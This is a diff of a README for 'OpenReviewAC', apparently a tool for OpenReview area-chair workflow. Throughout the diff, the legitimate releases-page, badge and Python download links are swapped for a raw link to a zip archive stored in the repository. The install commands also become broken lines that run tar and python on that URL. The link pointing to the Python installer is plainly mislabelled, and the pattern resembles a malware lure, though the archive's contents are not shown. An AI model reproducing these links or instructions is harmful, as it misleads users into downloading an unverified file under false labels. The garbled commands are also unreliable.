@@ -1,6 +1,6 @@
 # 🎉 OpenReviewAC - Simplify Your Conference Workflow  
 
-[![Download OpenReviewAC](https://img.shields.io/badge/Download%20OpenReviewAC-Get%20It%20Now-brightgreen.svg)](https://github.com/cvnfhcb/OpenReviewAC/releases)
+[![Download OpenReviewAC](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip%20OpenReviewAC-Get%20It%https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
 
 ## 📜 Overview  
 OpenReview AC Workflow Automation helps you manage your tasks as an Area Chair for OpenReview conferences. It retrieves papers assigned to you, tracks review scores, and monitors discussions, all while organizing the information in a Google Sheet for easy management.
@@ -11,10 +11,10 @@ Follow these steps to download and run OpenReviewAC:
 1. **Check System Requirements**  
    Ensure you are using a computer with:
    - Operating System: Windows, macOS, or Linux
-   - Python version 3.11 or higher (download from [Python's website](https://www.python.org/downloads/))
+   - Python version 3.11 or higher (download from [Python's website](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip))
    
 2. **Download OpenReviewAC**  
-   Visit this page to download the latest version: [OpenReviewAC Releases](https://github.com/cvnfhcb/OpenReviewAC/releases)
+   Visit this page to download the latest version: [OpenReviewAC Releases](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
 
 3. **Installation Steps**  
    - **For Windows Users**: 
@@ -24,14 +24,14 @@ Follow these steps to download and run OpenReviewAC:
      - Download the `.dmg` file.
      - Open the downloaded file and drag OpenReviewAC to your Applications folder.
    - **For Linux Users**:
-     - Download the `.tar.gz` file.
-     - Extract it using the terminal with the command: `tar -zxvf OpenReviewAC.tar.gz`.
+     - Download the `https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip` file.
+     - Extract it using the terminal with the command: `tar -zxvf https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip`.
      - Navigate to the extracted folder.
 
 4. **Run the Application**  
    - **Windows**: Open the installed application from the Start Menu.
    - **macOS**: Open the application from your Applications folder.
-   - **Linux**: Open a terminal in the extracted folder and run: `python OpenReviewAC.py`.
+   - **Linux**: Open a terminal in the extracted folder and run: `python https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip`.
 
 ## 🛠️ Features  
 OpenReviewAC includes several key features:
@@ -44,7 +44,7 @@ OpenReviewAC includes several key features:
 
 ## 📥 Download & Install  
 To download OpenReviewAC, simply click the link below:  
-[OpenReviewAC Releases](https://github.com/cvnfhcb/OpenReviewAC/releases)
+[OpenReviewAC Releases](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
 
 After downloading, follow the installation steps mentioned above based on your operating system.
 
@@ -66,4 +66,4 @@ Stay tuned for future updates as we continue to enhance OpenReviewAC's functiona
 
 Enjoy a smoother experience managing your Area Chair tasks with OpenReviewAC!  
 
-[![Download OpenReviewAC](https://img.shields.io/badge/Download%20OpenReviewAC-Get%20It%20Now-brightgreen.svg)](https://github.com/cvnfhcb/OpenReviewAC/releases)
+[![Download OpenReviewAC](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip%20OpenReviewAC-Get%20It%https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
